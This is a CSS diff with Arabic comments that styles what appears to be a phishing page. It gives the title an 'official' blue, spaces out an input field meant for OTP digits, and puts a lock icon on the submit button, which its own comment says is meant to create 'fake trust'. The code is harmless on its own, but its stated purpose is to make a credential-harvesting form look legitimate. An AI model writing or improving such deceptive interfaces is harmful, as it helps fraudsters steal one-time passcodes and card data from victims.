@@ -33,6 +33,22 @@ button {
     cursor: pointer;
     font-size: 16px;
 }
+#main-title {
+    color: #1a73e8; /* لون أزرق رسمي */
+    font-size: 22px;
+}
+
+#cardInput {
+    letter-spacing: 10px; /* لترك مسافة بين أرقام الـ OTP */
+    font-weight: bold;
+    font-size: 24px;
+    border: 2px solid #1a73e8;
+}
+
+/* إضافة أيقونة قفل صغيرة بجانب الزر لزيادة "الثقة المزيفة" */
+button::before {
+    content: "🔒 ";
+}
 
 button:hover {
     background-color: #218838;
